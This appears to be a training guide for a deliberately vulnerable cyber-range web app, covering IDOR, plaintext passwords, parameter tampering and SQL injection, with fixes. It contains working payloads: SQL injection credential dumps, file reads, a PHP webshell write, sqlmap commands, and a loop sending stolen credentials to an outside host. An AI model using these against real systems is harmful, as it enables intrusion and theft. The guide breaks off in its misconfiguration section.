# W Corp Cyber Range - Complete Vulnerability Guide

## üìö Table of Contents

1. [A01 - Broken Access Control (IDOR)](#a01---broken-access-control-idor)
2. [A02 - Cryptographic Failures](#a02---cryptographic-failures)
3. [A03 - Injection (Parameter Tampering)](#a03---injection-parameter-tampering)
4. [A03 - SQL Injection](#a03---sql-injection)
5. [A05 - Security Misconfiguration](#a05---security-misconfiguration)
6. [A07 - Identification and Authentication Failures](#a07---identification-and-authentication-failures)
7. [A08 - Software and Data Integrity Failures](#a08---software-and-data-integrity-failures)
8. [A10 - Server-Side Request Forgery (SSRF)](#a10---server-side-request-forgery-ssrf)

---

## A01 - Broken Access Control (IDOR)

### üéØ Overview

**IDOR (Insecure Direct Object Reference)** occurs when an application provides direct access to objects based on user-supplied input. Attackers can bypass authorization and access resources by modifying the value of a reference (like an ID parameter).

### üîç Vulnerability Location

- `/wcorp/api/user/profile/:id`
- `/wcorp/api/user/sensitive/:id`
- `/wcorp/api/user/notes/:id`

### üìñ How It Works

The application fails to verify that the authenticated user has permission to access the requested resource. It only checks if the user is logged in, not if they should access that specific user's data.

### üîì Step-by-Step Exploitation

#### Step 1: Create or Use a Regular User Account

```bash
# Register a new user
curl -X POST http://localhost:3000/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "password": "test123",
    "email": "attacker@test.com"
  }'
```

#### Step 2: Login and Capture Token

```bash
# Login to get authentication token
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "password": "test123"
  }' > login_response.json

# Extract the token
TOKEN=$(cat login_response.json | jq -r '.token')
echo "Token: $TOKEN"
```

#### Step 3: Access Your Own Profile (Legitimate)

```bash
# This returns your profile (user ID might be 5, for example)
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:3000/api/user/profile/5
```

**Response:**
```json
{
  "success": true,
  "user": {
    "id": 5,
    "username": "attacker",
    "email": "attacker@test.com",
    "role": "user",
    "created_at": "2025-10-06T12:00:00.000Z"
  }
}
```

#### Step 4: Exploit IDOR - Access Admin Profile

```bash
# Change the ID to 1 (typically the admin)
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:3000/api/user/profile/1
```

**Response:**
```json
{
  "success": true,
  "user": {
    "id": 1,
    "username": "admin",
    "email": "admin@wcorp.com",
    "role": "admin",
    "created_at": "2025-01-01T00:00:00.000Z"
  }
}
```

‚úÖ **Success!** You accessed admin data as a regular user.

#### Step 5: Access Sensitive Data

```bash
# Access sensitive information of any user
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:3000/api/user/sensitive/1

# Enumerate all users
for id in {1..10}; do
  echo "User ID: $id"
  curl -s -H "Authorization: Bearer $TOKEN" \
    http://localhost:3000/api/user/sensitive/$id | jq .
  echo "---"
done
```

**Sensitive Data Response:**
```json
{
  "success": true,
  "data": {
    "user_id": 1,
    "ssn": "123-45-6789",
    "credit_card": "4532-****-****-1234",
    "salary": 150000,
    "medical_records": "Confidential health data"
  }
}
```

#### Step 6: Access Internal Notes

```bash
# Access private notes
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:3000/api/user/notes/1
```

**Notes Response:**
```json
{
  "success": true,
  "notes": [
    {
      "id": 1,
      "user_id": 1,
      "title": "Admin Access",
      "content": "Default password: admin123",
      "created_at": "2025-01-01T00:00:00.000Z"
    }
  ]
}
```

### üí° What Makes This Vulnerable?

**Vulnerable Code:**
```javascript
// backend/server.js - No authorization check!
app.get('/api/user/profile/:id', authenticateToken, async (req, res) => {
  const userId = req.params.id;
  
  // Only checks if user is authenticated, not if they own this profile
  const [rows] = await db.execute(
    'SELECT id, username, email, role FROM users WHERE id = ?',
    [userId]
  );
  
  res.json({ success: true, user: rows[0] });
});
```

### üõ°Ô∏è How to Fix

**Secure Code:**
```javascript
app.get('/api/user/profile/:id', authenticateToken, async (req, res) => {
  const userId = req.params.id;
  const requestingUserId = req.user.userId; // From JWT token
  const requestingUserRole = req.user.role;
  
  // Check authorization: user can only access their own profile unless admin
  if (userId !== requestingUserId && requestingUserRole !== 'admin') {
    return res.status(403).json({ 
      success: false, 
      message: 'Access denied' 
    });
  }
  
  const [rows] = await db.execute(
    'SELECT id, username, email, role FROM users WHERE id = ?',
    [userId]
  );
  
  res.json({ success: true, user: rows[0] });
});
```

### üéì Learning Objectives

- Understand the difference between authentication and authorization
- Learn to always verify user permissions for resource access
- Practice identifying and exploiting IDOR vulnerabilities
- Understand the principle of least privilege

### üìä Impact Assessment

| Impact Type | Severity | Description |
|-------------|----------|-------------|
| Confidentiality | **HIGH** | Access to all user data |
| Integrity | **MEDIUM** | Can view but not modify |
| Availability | **LOW** | No direct impact |
| **Overall Risk** | **HIGH** | Critical data exposure |

---

## A02 - Cryptographic Failures

### üéØ Overview

**Cryptographic failures** occur when sensitive data is not properly protected. In this application, passwords are stored in plain text without any hashing or encryption, making them immediately readable if the database is compromised.

### üîç Vulnerability Location

- User registration endpoint: `/wcorp/api/register`
- User authentication: `/wcorp/api/login`
- Database: `users` table, `password` column

### üìñ How It Works

When users register or their passwords are stored, they are saved directly to the database without any cryptographic protection. Anyone with database access can read all passwords in plain text.

### üîì Step-by-Step Exploitation

#### Step 1: Register a New User

```bash
# Create a test account
curl -X POST http://localhost:3000/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "password": "MySecretPassword123!",
    "email": "test@example.com"
  }'
```

**Response:**
```json
{
  "success": true,
  "message": "User registered successfully"
}
```

#### Step 2: Access Database (Via SSRF or Direct Access)

```bash
# If you have database credentials from .env exposure (A05)
# Connect to the database
mysql -h localhost -u wcorp_user -p wcorp_db
```

#### Step 3: Query Passwords Table

```sql
-- View all usernames and passwords
SELECT id, username, password, email, role 
FROM users;
```

**Result:**
```
+----+----------+----------------------+-------------------+-------+
| id | username | password             | email             | role  |
+----+----------+----------------------+-------------------+-------+
|  1 | admin    | admin123             | admin@wcorp.com   | admin |
|  2 | john.doe | password123          | john@example.com  | user  |
|  3 | testuser | MySecretPassword123! | test@example.com  | user  |
+----+----------+----------------------+-------------------+-------+
```

‚úÖ **All passwords visible in plain text!**

#### Step 4: Use Discovered Credentials

```bash
# Login as admin using discovered password
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": "admin123"
  }'
```

#### Step 5: Credential Stuffing Attack

```bash
# Extract all credentials
mysql -h localhost -u wcorp_user -pwcorp_pass wcorp_db \
  -e "SELECT username, password FROM users;" \
  > credentials.txt

# Try these credentials on other services
while IFS=$'\t' read -r username password; do
  echo "Trying $username:$password on external service..."
  curl -X POST https://external-service.com/login \
    -d "username=$username&password=$password"
done < credentials.txt
```

### üí° What Makes This Vulnerable?

**Vulnerable Code:**
```javascript
// backend/server.js - Plain text storage!
app.post('/api/register', async (req, res) => {
  const { username, password, email } = req.body;
  
  // Password stored directly without hashing
  await db.execute(
    'INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)',
    [username, password, email, 'user'] // PASSWORD IN PLAIN TEXT!
  );
  
  res.json({ success: true, message: 'User registered successfully' });
});

// Login also exposes the plain text comparison
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  const [rows] = await db.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password] // Direct plain text comparison
  );
  
  if (rows.length > 0) {
    // Generate token and login
  }
});
```

### üõ°Ô∏è How to Fix

**Secure Code with bcrypt:**
```javascript
const bcrypt = require('bcrypt');

// Registration - Hash password
app.post('/api/register', async (req, res) => {
  const { username, password, email } = req.body;
  
  // Hash password with bcrypt (cost factor of 12)
  const hashedPassword = await bcrypt.hash(password, 12);
  
  await db.execute(
    'INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)',
    [username, hashedPassword, email, 'user']
  );
  
  res.json({ success: true, message: 'User registered successfully' });
});

// Login - Compare hashed password
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Get user with hashed password
  const [rows] = await db.execute(
    'SELECT * FROM users WHERE username = ?',
    [username]
  );
  
  if (rows.length === 0) {
    return res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
  
  const user = rows[0];
  
  // Compare provided password with hashed password
  const isValid = await bcrypt.compare(password, user.password);
  
  if (!isValid) {
    return res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
  
  // Generate token and login
  const token = jwt.sign(
    { userId: user.id, username: user.username, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '24h' }
  );
  
  res.json({ success: true, token });
});
```

### üéì Learning Objectives

- Understand why storing plain text passwords is dangerous
- Learn about password hashing algorithms (bcrypt, Argon2, PBKDF2)
- Understand the difference between hashing and encryption
- Learn about salt and work factors in password hashing
- Understand credential stuffing and password reuse attacks

### üìä Impact Assessment

| Impact Type | Severity | Description |
|-------------|----------|-------------|
| Confidentiality | **CRITICAL** | All passwords exposed |
| Integrity | **HIGH** | Account takeover possible |
| Availability | **MEDIUM** | Mass account compromise |
| **Overall Risk** | **CRITICAL** | Immediate security breach |

### üîê Security Best Practices

1. **Never store plain text passwords**
2. **Use strong hashing algorithms**: bcrypt, Argon2, or PBKDF2
3. **Use appropriate work factors**: bcrypt cost of 12+ recommended
4. **Add salt**: Automatically handled by bcrypt
5. **Implement password policies**: Length, complexity requirements
6. **Consider multi-factor authentication (MFA)**
7. **Monitor for credential stuffing attacks**
8. **Implement account lockout** after failed attempts

---

## A03 - Injection (Parameter Tampering)

### üéØ Overview

**Parameter tampering** and **injection** vulnerabilities occur when user-supplied input is not properly validated and can be used to manipulate application behavior or inject malicious code.

### üîç Vulnerability Location

- Registration endpoint: `/wcorp/api/register`
- User update endpoints: `/wcorp/api/user/update`
- Search and filter endpoints
- Any endpoint accepting user input

### üìñ How It Works

The application accepts user-supplied parameters without proper validation, allowing attackers to inject unexpected values or escalate privileges by tampering with parameters like `role`, `isAdmin`, etc.

### üîì Step-by-Step Exploitation

#### Step 1: Register with Role Escalation

```bash
# Attempt to register as admin by tampering with role parameter
curl -X POST http://localhost:3000/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "password": "test123",
    "email": "hacker@test.com",
    "role": "admin"
  }'
```

**Response:**
```json
{
  "success": true,
  "message": "User registered successfully"
}
```

#### Step 2: Verify Admin Access

```bash
# Login with the new account
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "password": "test123"
  }'
```

**Response:**
```json
{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "user": {
    "id": 6,
    "username": "hacker",
    "role": "admin"  // Successfully escalated to admin!
  }
}
```

#### Step 3: Access Admin Endpoints

```bash
# Now you can access admin-only endpoints
TOKEN="eyJhbGciOiJIUzI1NiIs..."

curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:3000/api/admin/users
```

**Response:**
```json
{
  "success": true,
  "users": [
    {"id": 1, "username": "admin", "role": "admin"},
    {"id": 2, "username": "john.doe", "role": "user"},
    {"id": 6, "username": "hacker", "role": "admin"}
  ]
}
```

#### Step 4: Profile Update Tampering

```bash
# Update any user's profile by tampering with ID
curl -X POST http://localhost:3000/api/user/update \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "id": 2,
    "role": "admin",
    "email": "hacked@evil.com"
  }'
```

#### Step 5: Hidden Parameter Discovery

```bash
# Try common hidden parameters
curl -X POST http://localhost:3000/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "test",
    "password": "test",
    "email": "test@test.com",
    "isAdmin": true,
    "is_admin": true,
    "admin": true,
    "superuser": true,
    "privileges": "admin"
  }'
```

#### Step 6: Numeric ID Tampering

```bash
# Tamper with numeric values
curl -X POST http://localhost:3000/api/order/create \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "item_id": 1,
    "quantity": 1,
    "price": 0.01
  }'
# Changed price from $100 to $0.01
```

### üí° What Makes This Vulnerable?

**Vulnerable Code:**
```javascript
// backend/server.js - No input validation!
app.post('/api/register', async (req, res) => {
  const { username, password, email, role } = req.body;
  
  // Accepts ANY value for role from user input
  const userRole = role || 'user'; // If attacker sends role="admin", it's accepted!
  
  await db.execute(
    'INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)',
    [username, password, email, userRole]
  );
  
  res.json({ success: true });
});

// Update endpoint with no validation
app.post('/api/user/update', authenticateToken, async (req, res) => {
  const { id, role, email } = req.body;
  
  // User can update ANY user with ANY role
  await db.execute(
    'UPDATE users SET role = ?, email = ? WHERE id = ?',
    [role, email, id]
  );
  
  res.json({ success: true });
});
```

### üõ°Ô∏è How to Fix

**Secure Code:**
```javascript
// backend/server.js - With validation
app.post('/api/register', async (req, res) => {
  const { username, password, email } = req.body;
  
  // Input validation
  if (!username || !password || !email) {
    return res.status(400).json({ 
      success: false, 
      message: 'Missing required fields' 
    });
  }
  
  // Email validation
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return res.status(400).json({ 
      success: false, 
      message: 'Invalid email format' 
    });
  }
  
  // Password requirements
  if (password.length < 8) {
    return res.status(400).json({ 
      success: false, 
      message: 'Password must be at least 8 characters' 
    });
  }
  
  // NEVER trust user input for sensitive fields like role
  // Always set role server-side
  const userRole = 'user'; // Hardcoded - not from user input
  
  // Sanitize username (alphanumeric only)
  const sanitizedUsername = username.replace(/[^a-zA-Z0-9_]/g, '');
  
  await db.execute(
    'INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)',
    [sanitizedUsername, password, email, userRole]
  );
  
  res.json({ success: true });
});

// Secure update endpoint
app.post('/api/user/update', authenticateToken, async (req, res) => {
  const { email } = req.body;
  const userId = req.user.userId; // From authenticated token, not user input
  
  // User can only update their own profile
  // Admin check required to update other users
  
  // Validate email
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return res.status(400).json({ 
      success: false, 
      message: 'Invalid email format' 
    });
  }
  
  // Only update allowed fields (email), never role
  await db.execute(
    'UPDATE users SET email = ? WHERE id = ?',
    [email, userId]
  );
  
  res.json({ success: true });
});
```

### üéì Learning Objectives

- Understand parameter tampering attacks
- Learn to never trust user input
- Practice input validation and sanitization
- Understand whitelist vs blacklist approaches
- Learn about mass assignment vulnerabilities
- Understand privilege escalation through parameter manipulation

### üìä Impact Assessment

| Impact Type | Severity | Description |
|-------------|----------|-------------|
| Confidentiality | **HIGH** | Privilege escalation |
| Integrity | **CRITICAL** | Data manipulation |
| Availability | **MEDIUM** | Service abuse |
| **Overall Risk** | **HIGH** | System compromise |

### üîê Security Best Practices

1. **Validate all user input** - Check type, format, range
2. **Use whitelist validation** - Only allow known good values
3. **Never trust client-side data** - Always validate server-side
4. **Implement proper access control** - Check permissions for every action
5. **Use parameterized queries** - Prevent SQL injection
6. **Sanitize input** - Remove or escape dangerous characters
7. **Define expected schema** - Validate against expected structure
8. **Log suspicious activity** - Monitor for tampering attempts

---

## A03 - SQL Injection

### üéØ Overview

**SQL Injection** is one of the most dangerous web application vulnerabilities. It occurs when user-supplied data is included in SQL queries without proper sanitization or parameterization, allowing attackers to manipulate database queries and execute arbitrary SQL commands.

### üîç Vulnerability Locations

- `/wcorp/api/legacy-login` - Vulnerable login endpoint
- `/wcorp/api/search` - Vulnerable user search endpoint

### üìñ How It Works

The application constructs SQL queries by concatenating user input directly into the query string. This allows attackers to inject their own SQL code, which gets executed by the database engine.

### üîì Step-by-Step Exploitation

#### Attack 1: Authentication Bypass via Legacy Login

**Step 1: Test for SQL Injection**

```bash
# Try a simple SQL injection test
curl -X POST http://localhost:3000/api/legacy-login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin'\'' OR '\''1'\''='\''1",
    "password": "anything"
  }'
```

**Step 2: Understanding the Injection**

The vulnerable query looks like:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

This always returns true because `'1'='1'` is always true!

**Step 3: Comment-Based Bypass**

```bash
# Use SQL comments to ignore password check
curl -X POST http://localhost:3000/api/legacy-login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin'\''-- ",
    "password": "irrelevant"
  }'
```

The query becomes:
```sql
SELECT * FROM users WHERE username = 'admin'-- AND password = 'irrelevant'
```
Everything after `--` is commented out!

**Step 4: Login as Any User**

```bash
# Login as specific user
curl -X POST http://localhost:3000/api/legacy-login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": "x'\'' OR '\''1'\''='\''1'\''-- "
  }'
```

**Response:**
```json
{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "user": {
    "id": 1,
    "username": "admin",
    "email": "admin@wcorp.com",
    "role": "admin"
  }
}
```

‚úÖ **Successfully bypassed authentication!**

#### Attack 2: Data Extraction via UNION-Based Injection

**Step 1: Determine Number of Columns**

```bash
# Test with UNION SELECT to find column count
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test'\'' UNION SELECT NULL-- "
  }'

# Try different column counts until it works (users table has 7 columns)
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test'\'' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- "
  }'
```

**Step 2: Extract Database Version**

```bash
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test'\'' UNION SELECT 1,@@version,3,4,5,6,7-- "
  }'
```

**Response:**
```json
{
  "success": true,
  "results": [
    {
      "id": 1,
      "username": "8.0.32",  // MySQL version exposed!
      "email": "3",
      "role": "4"
    }
  ]
}
```

**Step 3: Extract Database Name**

```bash
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test'\'' UNION SELECT 1,database(),user(),4,5,6,7-- "
  }'
```

**Step 4: List All Tables**

```bash
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test'\'' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- "
  }'
```

**Response:**
```json
{
  "success": true,
  "results": [
    {"username": "users"},
    {"username": "sessions"},
    {"username": "files"},
    {"username": "secret_data"}
  ]
}
```

**Step 5: Extract Column Names**

```bash
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test'\'' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='\''users'\''-- "
  }'
```

**Step 6: Extract All User Credentials**

```bash
# Most direct way - extract all columns from users table
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test'\'' UNION SELECT * FROM users-- "
  }'

# Or specify exact columns (7 columns total)
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test'\'' UNION SELECT id,username,password,email,role,created_at,updated_at FROM users-- "
  }'
```

**Response:**
```json
{
  "success": true,
  "results": [
    {
      "id": 1,
      "username": "admin",
      "password": "admin123",  // Plain text password exposed!
      "email": "admin@wcorp.com",
      "role": "admin",
      "created_at": "2025-01-01T00:00:00.000Z",
      "updated_at": "2025-01-01T00:00:00.000Z"
    },
    {
      "id": 2,
      "username": "john.doe",
      "password": "password123",
      "email": "john.doe@wcorp.com",
      "role": "user",
      "created_at": "2025-01-01T00:00:00.000Z",
      "updated_at": "2025-01-01T00:00:00.000Z"
    }
  ]
}
```

‚úÖ **Successfully extracted all user credentials!**

#### Attack 3: Boolean-Based Blind SQL Injection

When you don't see direct output, use true/false conditions:

```bash
# Test if database name starts with 'w'
curl -X POST http://localhost:3000/api/legacy-login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin'\'' AND SUBSTRING(database(),1,1)='\''w'\''-- ",
    "password": "x"
  }'

# If successful login = true, if failed = false
# Repeat for each character to extract data
```

**Automated Extraction Script:**
```python
import requests
import string

url = "http://localhost:3000/api/legacy-login"
chars = string.ascii_lowercase + string.digits + '_'
result = ""

for position in range(1, 20):
    for char in chars:
        payload = {
            "username": f"admin' AND SUBSTRING(database(),{position},1)='{char}'--",
            "password": "x"
        }
        
        response = requests.post(url, json=payload)
        
        if response.json().get('success'):
            result += char
            print(f"Found: {result}")
            break
    else:
        break  # No more characters

print(f"Database name: {result}")
```

#### Attack 4: Time-Based Blind SQL Injection

```bash
# Use SLEEP() to detect injection
curl -X POST http://localhost:3000/api/legacy-login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin'\'' OR SLEEP(5)-- ",
    "password": "x"
  }'

# If response takes 5 seconds, injection works!

# Extract data one bit at a time
curl -X POST http://localhost:3000/api/legacy-login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin'\'' OR IF(SUBSTRING(password,1,1)='\''a'\'',SLEEP(5),0)-- ",
    "password": "x"
  }'
```

#### Attack 5: Error-Based SQL Injection

```bash
# Trigger SQL errors to extract data
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test'\'' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)-- "
  }'
```

**Error Message Reveals Data:**
```json
{
  "success": false,
  "error": "Duplicate entry 'admin123:1' for key 'group_key'"
}
```

#### Attack 6: Stacked Queries (Data Modification)

```bash
# Execute multiple queries
curl -X POST http://localhost:3000/api/legacy-login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin'\'' ; UPDATE users SET role='\''admin'\'' WHERE id=5 ; --",
    "password": "x"
  }'

# Or create new admin user
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test'\'' ; INSERT INTO users (username,password,role) VALUES ('\''hacker'\'','\''password'\'','\''admin'\'') ; -- "
  }'
```

#### Attack 7: Reading Files from Server

```bash
# Read /etc/passwd (Linux)
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test'\'' UNION SELECT 1,LOAD_FILE('\''/etc/passwd'\''),3,4,5-- "
  }'

# Read application files
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test'\'' UNION SELECT 1,LOAD_FILE('\''/app/.env'\''),3,4,5-- "
  }'
```

#### Attack 8: Writing Files to Server (WebShell)

```bash
# Write a PHP webshell
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test'\'' UNION SELECT 1,'\''<?php system($_GET[\"cmd\"]); ?>'\'',3,4,5 INTO OUTFILE '\''/var/www/html/shell.php'\''--"
  }'

# Access the shell
curl http://localhost:3000/shell.php?cmd=whoami
```

### üí° What Makes This Vulnerable?

**Vulnerable Code:**
```javascript
// backend/server.js - Line 345-373 (Legacy Login)
app.post('/api/legacy-login', async (req, res) => {
  const { username, password } = req.body;
  
  // DANGEROUS: String concatenation!
  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  const [results] = await db.execute(sql);
  
  if (results.length > 0) {
    res.json({ success: true, user: results[0] });
  }
});

// backend/server.js - Line 376-388 (Search)
app.post('/api/search', async (req, res) => {
  const { query } = req.body;
  
  // DANGEROUS: User input directly in SQL!
  const sql = `SELECT * FROM users WHERE username LIKE '%${query}%' OR email LIKE '%${query}%'`;
  const [results] = await db.execute(sql);
  
  res.json({ success: true, results: results });
});
```

**Why This Is Dangerous:**
1. **No Input Sanitization** - User input used directly in SQL
2. **String Concatenation** - Allows breaking out of quotes
3. **No Prepared Statements** - SQL code and data mixed together
4. **Error Messages Exposed** - Reveals database structure
5. **No WAF/Filtering** - No protection layer

### üõ°Ô∏è How to Fix

**Secure Code:**
```javascript
// USE PARAMETERIZED QUERIES (Prepared Statements)
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Secure: Use ? placeholders and parameter array
  const sql = 'SELECT * FROM users WHERE username = ? AND password = ?';
  const [results] = await db.execute(sql, [username, password]);
  
  if (results.length > 0) {
    res.json({ success: true, user: results[0] });
  }
});

// Secure search with parameterization
app.post('/api/search', async (req, res) => {
  const { query } = req.body;
  
  // Input validation
  if (!query || query.length > 50) {
    return res.status(400).json({ error: 'Invalid query' });
  }
  
  // Parameterized query
  const sql = 'SELECT id, username, email FROM users WHERE username LIKE ? OR email LIKE ?';
  const searchTerm = `%${query}%`;
  const [results] = await db.execute(sql, [searchTerm, searchTerm]);
  
  res.json({ success: true, results: results });
});
```

**Additional Protections:**
```javascript
// 1. Input Validation
const validateInput = (input) => {
  // Whitelist allowed characters
  const regex = /^[a-zA-Z0-9_@.-]+$/;
  if (!regex.test(input)) {
    throw new Error('Invalid characters detected');
  }
  return input;
};

// 2. Escape Special Characters (as backup)
const escapeSQL = (str) => {
  return str.replace(/[\0\x08\x09\x1a\n\r"'\\\%]/g, (char) => {
    switch (char) {
      case "\0": return "\\0";
      case "\x08": return "\\b";
      case "\x09": return "\\t";
      case "\x1a": return "\\z";
      case "\n": return "\\n";
      case "\r": return "\\r";
      case "\"":
      case "'":
      case "\\":
      case "%":
        return "\\" + char;
    }
  });
};

// 3. Use ORM (Sequelize, TypeORM)
const users = await User.findAll({
  where: {
    username: {
      [Op.like]: `%${query}%`
    }
  }
});

// 4. Least Privilege Database User
// Don't use root/admin database accounts
// Create limited user with only needed permissions
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON wcorp_db.users TO 'webapp'@'localhost';
-- NO DELETE, DROP, FILE permissions!

// 5. Stored Procedures (Alternative)
CREATE PROCEDURE GetUser(IN p_username VARCHAR(50))
BEGIN
  SELECT * FROM users WHERE username = p_username;
END;

// Call from code
await db.execute('CALL GetUser(?)', [username]);

// 6. Web Application Firewall (WAF)
const detectSQLi = (input) => {
  const patterns = [
    /(\s|^)(union|select|insert|update|delete|drop|create|alter)(\s|$)/i,
    /--/,
    /;/,
    /\/\*/,
    /xp_/i,
    /sp_/i
  ];
  
  for (let pattern of patterns) {
    if (pattern.test(input)) {
      return true; // Potential SQL injection
    }
  }
  return false;
};

app.post('/api/login', (req, res, next) => {
  if (detectSQLi(req.body.username) || detectSQLi(req.body.password)) {
    return res.status(400).json({ error: 'Invalid input detected' });
  }
  next();
});
```

### üéì Learning Objectives

- Understand how SQL injection vulnerabilities occur
- Learn various SQL injection techniques (UNION, Boolean, Time-based, Error-based)
- Practice exploiting SQL injection to extract data
- Understand the importance of parameterized queries
- Learn defense-in-depth strategies for SQL injection prevention

### üìä Impact Assessment

| Impact Type | Severity | Description |
|-------------|----------|-------------|
| Confidentiality | **CRITICAL** | Complete database access, all data readable |
| Integrity | **CRITICAL** | Can modify/delete any data |
| Availability | **HIGH** | Can drop tables, crash database |
| Authentication | **CRITICAL** | Complete authentication bypass |
| **Overall Risk** | **CRITICAL** | Complete system compromise possible |

### üîç Detection Methods

**1. Manual Testing:**
```bash
# Look for SQL error messages
' OR '1'='1
" OR "1"="1
' OR '1'='1'--
admin'--
' UNION SELECT NULL--
```

**2. Automated Scanning:**
```bash
# Using sqlmap
sqlmap -u "http://localhost:3000/api/legacy-login" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  --level=5 \
  --risk=3 \
  --batch

# Extract all databases
sqlmap -u "http://localhost:3000/api/legacy-login" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  --dbs

# Dump all tables
sqlmap -u "http://localhost:3000/api/legacy-login" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  -D wcorp_db \
  --dump
```

### üö® Real-World Impact Examples

1. **2012 - Yahoo Voices**: 450,000 passwords leaked via SQL injection
2. **2015 - TalkTalk**: ¬£400,000 fine after SQL injection breach
3. **2017 - Equifax**: 147 million records exposed (indirect SQL injection via Apache Struts)
4. **2019 - DoorDash**: 4.9 million records exposed

### üéØ Testing Checklist

- [ ] Test login forms with `' OR '1'='1--`
- [ ] Test search fields with `' UNION SELECT NULL--`
- [ ] Look for database error messages
- [ ] Try comment characters (`--`, `#`, `/*`)
- [ ] Test time-based injection with `SLEEP()`
- [ ] Attempt to extract database version
- [ ] Try to list tables and columns
- [ ] Attempt authentication bypass
- [ ] Test for stacked queries
- [ ] Try file read/write operations

### üîê Security Best Practices

1. **Always use parameterized queries/prepared statements**
2. **Never concatenate user input into SQL**
3. **Validate and sanitize ALL user input**
4. **Use least privilege database accounts**
5. **Disable detailed error messages in production**
6. **Implement Web Application Firewall (WAF)**
7. **Use ORM frameworks when possible**
8. **Regular security testing and code review**
9. **Monitor database logs for suspicious queries**
10. **Keep database software updated**

---

## A05 - Security Misconfiguration

### üéØ Overview

**Security misconfiguration** vulnerabilities occur when sensitive configuration files, debugging information, or administrative interfaces are publicly accessible. This includes exposed environment variables, configuration files, and unprotected endpoints.

### üîç Vulnerability Location

- `/.env` - Environment variables endpoint
- `/package.json` - Package information
- `/robots.txt` - Directory structure
- `/sitemap.xml` - Application structure
- Server headers and error messages

### üìñ How It Works

The application exposes sensitive configuration information through publicly accessible endpoints, revealing database credentials, API keys, internal paths, and system architecture.

### üîì Step-by-Step Exploitation

#### Step 1: Discover Configuration Exposure

```bash
# Test for common configuration files
curl http://localhost:3000/.env
curl http://localhost:3000/package.json
curl http://localhost:3000/robots.txt
curl http://localhost:3000/sitemap.xml
```

#### Step 2: Extract Environment Variables

```bash
# Access exposed .env endpoint
curl http://localhost:3000/.env
```

**Response:**
```json
{
  "message": "VULNERABILITY: A05 - Security Misconfiguration",
  "description": "Environment file exposed",
  "data": {
    "NODE_ENV": "production",
    "DB_HOST": "db",
    "DB_USER": "wcorp_user",
